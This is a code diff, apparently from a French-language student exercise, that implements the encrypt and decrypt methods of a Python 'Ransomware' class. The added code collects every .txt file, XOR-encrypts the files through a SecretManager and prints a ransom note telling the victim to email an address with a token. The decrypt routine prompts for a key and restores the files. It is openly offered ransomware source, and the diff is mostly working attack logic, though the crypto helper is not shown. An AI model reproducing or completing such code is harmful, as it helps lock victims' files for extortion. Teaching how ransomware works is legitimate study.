@@ -37,7 +37,7 @@ ENCRYPT_MESSAGE = """
 
 
                                                  
-Your txt files have been locked. Send an email to Jenesuispassimechant@jedoisjustemanger.com with title '{token}' to unlock your data. 
+Your txt files have been locked. Send an email to Jenesuispassimechant@jedoisjustemanger.com with title '{token}' to (maybe) unlock your data 😉. 
 """
 class Ransomware:
     def __init__(self) -> None:
@@ -61,11 +61,52 @@ class Ransomware:
 
     def encrypt(self):
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # get all txt files
+        files = self.get_files("*.txt")
+
+        # creation du secret manager
+        secret_manager = SecretManager()
+
+        # appel de la fonction setup
+        secret_manager.setup()
+
+        # Chiffrement des fichiers
+        secret_manager.xorfiles(files)
+
+        # Annonce de de l'attaqueà la victime
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
+
 
     def decrypt(self):
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        #Chargement des éléments nécessaires au déchiffrement
+        secret_manager = SecretManager()
+        secret_manager.load()
+
+        #Déchiffrement des fichiers
+        files = self.get_files("*.txt")
+        while True:
+            try:
+                #demande la clé de déchiffrement
+                candidate_key = input("Entre la clé (Attention ! Te trompes pas, ça serait dommage de ne pas revoir tes précieux fichiers): ")
+                #appel de la fonction set_key
+                secret_manager.set_key(candidate_key)
+                # Appel de la fonction xorfiles pour déchiffrer les fichiers
+                secret_manager.xorfiles(files)
+                # Appel de la fonction clean
+                secret_manager.clean()
+                # Affichage du message de déchiffrement
+                print("Ok, tout s'est bien passé ! Tu est tranquille (pour le moment...)!")
+                # Sortie de la boucle
+                break
+
+            except ValueError:
+                # Affichage du message d'erreur
+                print("A quoi tu joues là ?! Pas de clé valide, pas de fichier...")
+                # Sortie de la boucle
+                break
+
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
